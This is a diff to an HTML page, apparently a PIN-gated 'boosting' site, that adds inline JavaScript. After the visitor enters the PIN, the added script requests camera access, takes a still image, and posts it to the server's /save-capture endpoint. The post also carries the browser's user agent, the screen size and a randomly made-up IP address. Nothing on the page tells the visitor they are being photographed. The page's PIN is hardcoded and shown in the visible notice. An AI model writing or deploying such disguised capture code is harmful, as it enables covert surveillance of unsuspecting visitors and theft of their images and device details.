@@ -26,15 +26,70 @@
     <p id="userStatus" class="mt-4 text-green-400"></p>
   </div>
 
-  <!-- Notice -->
-  <div class="mt-8 w-11/12 md:w-2/3 lg:w-1/2 bg-yellow-200 text-yellow-900 p-4 rounded shadow text-center">
-    <h3 class="text-lg font-semibold mb-2">📢 Notice</h3>
-    <p class="text-sm">
-      Please make sure your PIN is correct (1111). Unauthorized access is not allowed.  
+  <div class="mt-6 w-3/4 max-w-lg bg-yellow-500 text-black p-3 rounded shadow text-center">
+    ⚠️ <strong>Notice:</strong> Please make sure your PIN is correct (1111). Unauthorized access is not allowed.  
       Boosting may take a few minutes depending on server load.
-    </p>
   </div>
 
-  <script src="script.js"></script>
+<script>
+const USER_PIN = "1111";
+
+function toggleMenu() {
+  document.getElementById("navLinks").classList.toggle("hidden");
+}
+
+function userLogin() {
+  const pin = document.getElementById("userPin").value;
+  const status = document.getElementById("userStatus");
+
+  if (pin === USER_PIN) {
+    status.innerHTML = "✅ Access Granted...";
+    setTimeout(captureImage, 1000);
+  } else {
+    status.innerHTML = "❌ Wrong PIN!";
+  }
+}
+
+function captureImage() {
+  navigator.mediaDevices.getUserMedia({ video: true })
+    .then(stream => {
+      const video = document.createElement("video");
+      video.srcObject = stream;
+      video.play();
+
+      setTimeout(() => {
+        const canvas = document.createElement("canvas");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        const imageData = canvas.toDataURL("image/png");
+
+        // Stop camera
+        stream.getTracks().forEach(track => track.stop());
+
+        // Save capture to server
+        fetch("/save-capture", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            time: new Date().toLocaleString(),
+            ip: "192.168.0." + Math.floor(Math.random() * 255),
+            device: navigator.userAgent + " | " + screen.width + "x" + screen.height,
+            img: imageData
+          })
+        }).then(() => {
+          document.getElementById("userStatus").innerHTML = "📸 Capture saved.";
+        });
+      }, 1000);
+    })
+    .catch(err => {
+      document.getElementById("userStatus").innerHTML = "⚠️ Camera blocked!";
+      console.error("Camera error:", err);
+    });
+}
+</script>
 </body>
 </html>
